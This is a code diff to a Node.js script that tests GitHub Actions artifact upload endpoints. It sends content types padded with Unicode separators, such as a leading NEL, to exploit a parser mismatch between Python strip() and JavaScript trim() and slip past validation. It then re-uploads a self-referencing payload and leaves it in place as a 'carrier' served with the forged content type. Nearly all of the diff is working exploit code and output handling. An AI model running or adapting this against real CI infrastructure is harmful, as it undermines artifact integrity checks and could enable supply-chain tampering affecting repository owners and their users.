@@ -95,6 +95,19 @@ async function findId(name) {
   return null;
 }
 
+// GetSignedArtifactURL hands back the SAS url directly, so rsct can be read without the
+// api.github.com redirect dance
+async function signedUrlFor(name) {
+  const r = await twirp('GetSignedArtifactURL', { ...ids, name });
+  if (r.status !== 200) return { ok: false, status: r.status, body: r.body.toString('utf8').slice(0, 160) };
+  try {
+    const u = new URL(JSON.parse(r.body.toString('utf8')).signed_url);
+    return { ok: true, rsct: u.searchParams.get('rsct'), rscd: u.searchParams.get('rscd') };
+  } catch (e) {
+    return { ok: false, status: r.status, body: r.body.toString('utf8').slice(0, 160) };
+  }
+}
+
 async function inspect(id) {
   const dl = await api(`/repos/${REPO}/actions/artifacts/${id}/zip`);
   if (!dl.headers.location) return { status: dl.status, rsct: null, served: null };
@@ -119,69 +132,62 @@ function usable(ct) {
 
 (async () => {
   const stamp = Date.now();
-  // Final build: one artifact per candidate content type, each one re-PUT with the payload that
-  // embeds its OWN id (the earlier run left the non-picked artifacts holding build(0), which is
-  // why the replay hash did not match the fingerprint).
-  //   text/plain       -> Node skips validation, so sourceSha256 = sha256(our bytes)
-  //   application/json -> Python accepts the type on the direct origin re-check
-  // Everything we APPENDED to the mime type was rejected by GitHub's validator, so probe the
-  // other side (leading separators) and the validator's boundaries. A value whose Python .strip()
-  // yields "application/json" while JS .trim() does not closes the chain: Python accepts the type
-  // on both the replay and the direct origin re-check, while Node skips the repositoryName test.
-  const wanted = [
-    ['lead-NEL', '\u0085application/json'],
-    ['lead-FS', '\u001capplication/json'],
-    ['lead-space', ' application/json'],
-    ['lead-tab', '\tapplication/json'],
-    ['lead-NBSP', '\u00a0application/json'],
-    ['trail-NBSP', 'application/json\u00a0'],
-    ['trail-tab', 'application/json\t'],
-    ['upper', 'APPLICATION/JSON'],
-    ['dot', 'application/json.'],
-    ['plus', 'application/json+json'],
-  ].map(([tag, mime]) => ({ version: 7, mime, tag, name: `${tag}-${stamp}` }));
+  // Never tested before: v4/v6 WITH a mime_type. Our earlier v4/v6 runs sent no mime_type at all
+  // (rsct was pinned to application/zip), and v7 validates it strictly. If an older version stores
+  // mime_type without validating and still uses it for rsct, the NEL variant gets through.
+  const NELLEAD = '\u0085application/json';
+  const NELTAIL = 'application/json\u0085';
+  const trials = [
+    { v: 6, mime: NELLEAD, tag: 'v6-lead' },
+    { v: 6, mime: NELTAIL, tag: 'v6-tail' },
+    { v: 6, mime: 'application/json', tag: 'v6-clean' },
+    { v: 4, mime: NELLEAD, tag: 'v4-lead' },
+    { v: 4, mime: 'application/json', tag: 'v4-clean' },
+    { v: 7, mime: NELLEAD, tag: 'v7-lead(control)' },
+  ].map((t) => ({ ...t, name: `${t.tag.replace(/[^a-z0-9-]/gi, '')}-${stamp}` }));
 
-  const out = [];
-  for (const v of wanted) {
+  let winner = null;
+  for (const t of trials) {
     const created = await twirp('CreateArtifact', {
-      ...ids, name: v.name, version: v.version, mime_type: v.mime,
+      ...ids, name: t.name, version: t.v, mime_type: t.mime,
     });
     let signed;
     try { signed = JSON.parse(created.body.toString('utf8')).signed_upload_url; } catch { /* noop */ }
     if (!signed) {
-      console.log(`[-] ${v.tag} CreateArtifact=${created.status} ${created.body.toString('utf8').slice(0, 140)}`);
+      console.log(`[-] ${t.tag} create=${created.status} ${created.body.toString('utf8').slice(0, 120)}`);
       continue;
     }
     const placeholder = build(0);
-    await putBlob(signed, placeholder, v.mime);
-    const digest = `sha256:${crypto.createHash('sha256').update(placeholder).digest('hex')}`;
+    const put = await putBlob(signed, placeholder, t.mime);
     const fin = await twirp('FinalizeArtifact', {
-      ...ids, name: v.name, size: String(PAD_TO), hash: digest,
+      ...ids, name: t.name, size: String(PAD_TO),
+      hash: `sha256:${crypto.createHash('sha256').update(placeholder).digest('hex')}`,
     });
-    if (fin.status !== 200) {
-      console.log(`[-] ${v.tag} finalize=${fin.status} ${fin.body.toString('utf8').slice(0, 140)}`);
-      continue;
-    }
-    const id = await findId(v.name);
-    if (!id) { console.log(`[-] ${v.tag} never listed`); continue; }
-
-    // now that the id is known, overwrite the blob with the payload that references it
-    const payload = build(id);
-    const put2 = await putBlob(signed, payload, v.mime);
-    const got = await inspect(id);
-    const ok = usable(got.served);
-    console.log(`[*] ${v.tag} mime=${JSON.stringify(v.mime)} id=${id} rePUT=${put2.status}`
-      + ` served=${JSON.stringify(got.served)} hex=${Buffer.from(got.served || '', 'latin1').toString('hex')}`
-      + ` bodyMatches=${got.body ? got.body.equals(payload) : false}${ok ? '  <-- USABLE' : ''}`);
-    out.push({ ...v, id, served: got.served, body: got.body, payload });
+    const sig = await signedUrlFor(t.name);
+    const id = fin.status === 200 ? await findId(t.name) : null;
+    const dl = id ? await inspect(id) : {};
+    const hex = (x) => Buffer.from(x || '', 'latin1').toString('hex');
+    const hit = (sig.rsct && sig.rsct.includes('\u0085')) || (dl.served && dl.served.includes('\u0085'));
+    console.log(`[*] ${t.tag} create=200 put=${put.status} finalize=${fin.status} id=${id}`
+      + ` rsct=${JSON.stringify(sig.rsct)} rsct_hex=${hex(sig.rsct)}`
+      + ` served=${JSON.stringify(dl.served)} served_hex=${hex(dl.served)}${hit ? '  <-- HIT' : ''}`);
+    if (hit && id && !winner) winner = { ...t, id, signed, served: dl.served, rsct: sig.rsct };
   }
 
   console.log('\n===== HAND THIS BACK =====');
-  console.log('USABLE_FOUND=' + out.some((r) => usable(r.served)));
-  for (const r of out.filter((x) => usable(x.served)).concat(out.slice(0, 1))) {
-    console.log(`${r.tag.toUpperCase()}_ID=${r.id}`);
-    console.log(`${r.tag.toUpperCase()}_CT=${JSON.stringify(r.served)}`);
-    console.log(`${r.tag.toUpperCase()}_BODY_OK=${r.body ? r.body.equals(r.payload) : false}`);
-    console.log(`${r.tag.toUpperCase()}_SHA256=${crypto.createHash('sha256').update(r.payload).digest('hex')}`);
+  console.log('HIT=' + Boolean(winner));
+  if (winner) {
+    // leave the carrier in place: payload referencing its own id, served with the odd content type
+    const payload = build(winner.id);
+    const put2 = await putBlob(winner.signed, payload, winner.mime);
+    const dl = await inspect(winner.id);
+    console.log('TAG=' + winner.tag);
+    console.log('REPOSITORY=' + `${REPO.toLowerCase()}/actions/artifacts/${winner.id}/zip`);
+    console.log('ARTIFACT_ID=' + winner.id);
+    console.log('REPUT=' + put2.status);
+    console.log('SERVED_CT_HEX=' + Buffer.from(dl.served || '', 'latin1').toString('hex'));
+    console.log('BODY_OK=' + (dl.body ? dl.body.equals(payload) : false));
+    console.log('BODY_B64=' + (dl.body ? dl.body.toString('base64') : ''));
+    console.log('SHA256=' + crypto.createHash('sha256').update(payload).digest('hex'));
   }
 })().catch((e) => { console.error('[x]', e); process.exit(1); });
